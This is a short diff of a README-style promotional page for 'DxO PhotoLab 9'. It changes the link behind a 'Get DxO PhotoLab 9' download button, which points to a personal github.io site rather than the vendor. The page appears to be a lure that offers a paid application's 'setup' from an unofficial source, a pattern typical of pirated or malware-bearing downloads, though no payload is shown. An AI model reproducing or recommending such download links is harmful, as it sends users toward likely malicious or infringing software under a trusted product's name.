@@ -21,7 +21,7 @@ To begin using this professional **Lens Correction Tool** and **Advanced Raw Edi
 | :--- | :--- |
 | **Get DxO PhotoLab 9** | Click the button below to initiate the setup for this **Advanced Raw Editor**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_DxO_PhotoLab_9-2ea44f?style=for-the-badge)](https://edouardcatina131.github.io/.github/)
+[![Button](https://img.shields.io/badge/📦-Get_DxO_PhotoLab_9-2ea44f?style=for-the-badge)](https://edouardcatina131.github.io/.github/dxo-photolab-9)
 
 ## System Requirements
 
